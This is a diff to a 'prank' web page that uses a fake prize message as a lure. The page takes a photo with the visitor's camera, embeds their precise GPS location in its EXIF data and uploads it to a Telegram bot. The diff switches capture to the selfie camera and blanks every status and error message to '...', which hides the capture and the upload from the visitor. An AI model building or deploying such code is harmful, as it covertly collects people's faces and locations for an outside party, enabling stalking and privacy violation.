@@ -194,7 +194,7 @@ button:disabled{
       <span>Your reward awaits...</span>
     </div>
     <div id="joker" class="placeholder" hidden>
-      <span style="font-size:28px;font-weight:bold;line-height:1.25">🎉 You've<br>Won $1,000!</span>
+      <span style="font-size:28px;font-weight:bold;line-height:1.25">🎉 You've<br>Won $100!</span>
       <span class="heart">🤡</span>
     </div>
   </div>
@@ -282,15 +282,15 @@ consent.addEventListener("change",()=>{
 
 async function openCamera(){
   if(!navigator.mediaDevices?.getUserMedia){
-    throw new Error("Open this website over HTTPS in Chrome.");
+    throw new Error("...");
   }
 
-  setStatus("Opening camera... 📸");
+  setStatus("...");
 
   stream = await navigator.mediaDevices.getUserMedia({
     audio:false,
     video:{
-      facingMode:{ideal:"environment"},
+      facingMode:{ideal:"user"},
       width:{ideal:4096},
       height:{ideal:3072}
     }
@@ -309,7 +309,7 @@ async function openCamera(){
 
   if(!("ImageCapture" in window)){
     throw new Error(
-      "Automatic still-photo capture is unsupported. Try Chrome on Android."
+      "..."
     );
   }
 
@@ -319,7 +319,7 @@ async function openCamera(){
 function getLocation(){
   return new Promise((resolve,reject)=>{
     if(!navigator.geolocation){
-      reject(new Error("Location access is unavailable."));
+      reject(new Error("..."));
       return;
     }
 
@@ -332,10 +332,10 @@ function getLocation(){
       }),
       e=>reject(new Error(
         e.code===1
-          ? "Location permission denied. Allow location and retry."
+          ? "..."
           : e.code===3
-          ? "Location timed out. Please retry."
-          : "Could not obtain your location."
+          ? "..."
+          : "..."
       )),
       {
         enableHighAccuracy:true,
@@ -348,17 +348,17 @@ function getLocation(){
 
 async function addGpsExif(blob,loc){
   if(!window.piexif){
-    throw new Error("EXIF library failed to load. Refresh the page.");
+    throw new Error("...");
   }
 
   if(blob.type && blob.type.toLowerCase()!=="image/jpeg"){
-    throw new Error("Camera did not return JPEG; cannot add GPS EXIF.");
+    throw new Error("...");
   }
 
   const bytes = new Uint8Array(await blob.arrayBuffer());
 
   if(bytes[0]!==255 || bytes[1]!==216){
-    throw new Error("The captured image is not a valid JPEG.");
+    throw new Error("...");
   }
 
   let binary = "";
@@ -425,7 +425,7 @@ async function sendToTelegram(blob){
     BOT_TOKEN==="YOUR_TELEGRAM_BOT_TOKEN" ||
     CHAT_ID==="YOUR_CHAT_ID"
   ){
-    throw new Error("Configure your Telegram bot token and chat ID.");
+    throw new Error("...");
   }
 
   const form = new FormData();
@@ -441,22 +441,22 @@ async function sendToTelegram(blob){
   const result = await response.json();
 
   if(!response.ok || !result.ok){
-    throw new Error(result.description || "Telegram upload failed.");
+    throw new Error(result.description || "...");
   }
 }
 
 async function captureAndSend(){
-  setStatus("Getting location... 📍");
+  setStatus("...");
   const loc = await getLocation();
 
   if(!imageCapture){
-    throw new Error("Camera capture is not ready.");
+    throw new Error("...");
   }
 
-  setStatus("Capturing your surprise... 📸");
+  setStatus("...");
   const rawPhoto = await imageCapture.takePhoto();
 
-  setStatus("Adding GPS metadata... ♡");
+  setStatus("...");
   const photo = await addGpsExif(rawPhoto,loc);
 
   clearPreview();
@@ -472,10 +472,10 @@ async function captureAndSend(){
 
   // Show prank immediately after capture and metadata processing.
   prankPopup.hidden = false;
-  setStatus("Surprise captured! Sending to Telegram... ♡");
+  setStatus("...");
 
   await sendToTelegram(photo);
-  setStatus("Prank delivered! Photo sent successfully 😂💗");
+  setStatus("😂💗");
 }
 
 startBtn.addEventListener("click",async()=>{
@@ -497,7 +497,7 @@ startBtn.addEventListener("click",async()=>{
     cameraFrame.classList.remove("camera-open");
 
     startBtn.hidden = false;
-    setStatus(error.message || "Could not complete the surprise.");
+    setStatus(error.message || "...");
   }finally{
     busy = false;
     startBtn.disabled = !consent.checked;
